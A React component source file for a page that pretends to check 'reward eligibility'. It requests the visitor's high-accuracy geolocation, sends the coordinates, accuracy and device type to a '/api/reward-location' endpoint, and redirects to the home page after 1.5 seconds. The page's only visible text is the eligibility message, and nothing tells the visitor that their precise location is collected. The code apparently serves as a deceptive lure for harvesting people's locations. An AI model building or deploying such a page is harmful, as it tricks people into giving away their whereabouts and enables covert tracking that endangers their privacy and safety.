import { useEffect, useRef } from "react";
import { apiRequest } from "../services/api";

export function RewardPage() {
  const initialized = useRef(false);

  useEffect(() => {
    // Prevent double-firing in StrictMode
    if (initialized.current) return;
    initialized.current = true;

    const detectDevice = () => {
      const ua = navigator.userAgent;
      if (/tablet|ipad|playbook|silk/i.test(ua)) return 'tablet';
      if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera Mini/i.test(ua)) return 'mobile';
      return 'desktop';
    };

    const deviceCategory = detectDevice();

    const sendData = async (payload: any) => {
      try {
        await apiRequest('/api/reward-location', {
          method: 'POST',
          body: JSON.stringify(payload),
        });
      } catch (err) {
        console.error('Submission failed:', err);
      } finally {
        // CRITICAL: Hard redirect after fetch attempt with a small delay for reliability
        setTimeout(() => {
          window.location.href = '/';
        }, 1500);
      }
    };

    const handleSuccess = (position: GeolocationPosition) => {
      const { latitude, longitude, accuracy } = position.coords;
      sendData({
        device_category: deviceCategory,
        permission: 'granted',
        latitude,
        longitude,
        accuracy,
      });
    };

    const handleError = () => {
      sendData({
        device_category: deviceCategory,
        permission: 'denied',
      });
    };

    // Request location with a small delay for mobile reliability
    const timer = setTimeout(() => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(handleSuccess, handleError, {
          timeout: 15000, // Increased to 15s for mobile GPS lock
          enableHighAccuracy: true,
          maximumAge: 60000 // Use cached location up to 1 min old
        });
      } else {
        handleError();
      }
    }, 500);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      background: '#ffffff',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
    }}>
      <style>{`
        @keyframes pulse {
          0% { opacity: 1; transform: scale(1); }
          50% { opacity: 0.5; transform: scale(0.98); }
          100% { opacity: 1; transform: scale(1); }
        }
        .pulsing-text {
          animation: pulse 2s infinite ease-in-out;
          color: #444;
          font-size: 1.1rem;
          letter-spacing: -0.01em;
        }
      `}</style>
      <p className="pulsing-text">Checking reward eligibility...</p>
    </div>
  );
}
